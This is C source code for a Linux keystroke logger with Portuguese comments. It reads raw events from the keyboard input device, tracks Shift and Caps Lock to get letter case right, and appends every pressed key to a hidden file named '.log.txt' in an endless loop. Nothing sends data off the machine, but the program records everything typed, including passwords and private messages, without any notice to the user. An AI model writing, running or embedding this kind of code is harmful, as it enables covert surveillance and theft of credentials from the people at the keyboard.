#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <ctype.h>
#include <stdbool.h>
#include "keymap.h"
#include <linux/input.h>
#include <sys/ioctl.h>

#define BITS_PER_LONG (8 * sizeof(long))
#define NBITS(x) ((((x) - 1) / BITS_PER_LONG) + 1) 
#define IS_BIT_SET(bit, array) ((array[(bit) / BITS_PER_LONG] >> ((bit) % BITS_PER_LONG)) & 1)

char device[64];

int scan_device(char *device_path, size_t size);

int caps_status() {
    int fd = scan_device(device, sizeof(device));
    if(fd < 0) return -1;
    unsigned long led_bits[NBITS(LED_CNT)];
    
    if (ioctl(fd, EVIOCGLED(sizeof(led_bits)), led_bits) < 0) {
        close(fd); 
        return -1;
    }

    int status = IS_BIT_SET(LED_CAPSL, led_bits);
    close(fd);
    
    return status;
}

bool caps_lock_on;
bool shift_pressed = false;

int main(int argc, char** argv) {   
    int fd = scan_device(device, sizeof(device));
    if(fd < 0) {
        printf("Erro: Teclado real não encontrado.\n");
        return -1;
    }
    
    // Validação inicial do Caps Lock ANTES do loop (Sincronização)
    int status = caps_status(); 
    if(status < 0) {
        close(fd);
        return -1;
    }
    caps_lock_on = (bool)status;

    // O terceiro argumento (0644) define as permissões de leitura/escrita se o arquivo precisar ser criado
    int log_fd = open(".log.txt", O_WRONLY | O_APPEND | O_CREAT, 0644); 
    if(log_fd < 0) {
        close(fd);
        return -1;
    }

    struct input_event ev;

    int trigger = 0;
    while(1) {
        // O programa dorme aqui, sem gastar CPU, até você interagir com o teclado
        ssize_t bytes = read(fd, &ev, sizeof(ev));
        if (bytes < (ssize_t)sizeof(ev)) continue; // Evita ler eventos quebrados ou incompletos
        
        //  Validação do Caps Lock por EVENTO. O kernel te avisa se o LED ligou/desligou
        if (ev.type == EV_LED && ev.code == LED_CAPSL) {
            caps_lock_on = (bool)ev.value; 
        }
            
        //  Lógica das teclas modificadoras (Shift)
        if(ev.value == 1) { // Tecla Pressionada
            if(ev.code == KEY_LEFTSHIFT || ev.code == KEY_RIGHTSHIFT) shift_pressed = true;
        }   
        if(ev.value == 0) { // Tecla Solta
            if(ev.code == KEY_LEFTSHIFT || ev.code == KEY_RIGHTSHIFT) shift_pressed = false;
        }       
        
        bool should_uppercase = (shift_pressed != caps_lock_on); 
  
        if(ev.type == EV_KEY && ev.value == 1) {
            const char *key = key_code_names[ev.code];
            if(!key) key = "?"; // Evita crash se ev.code for maior que o mapeado
            
            char _key[strlen(key) + 1];
            strcpy(_key, key);

            if(!should_uppercase) {
                int i = 0;
                while(_key[i] != '\0') {
                    _key[i] = tolower(_key[i]);
                    i++;
                }
            }
            
            ssize_t bytes_log = write(log_fd, _key, strlen(_key));
            (void)bytes_log; 
        }
    }
    close(fd);
    close(log_fd);
    return 0;
}
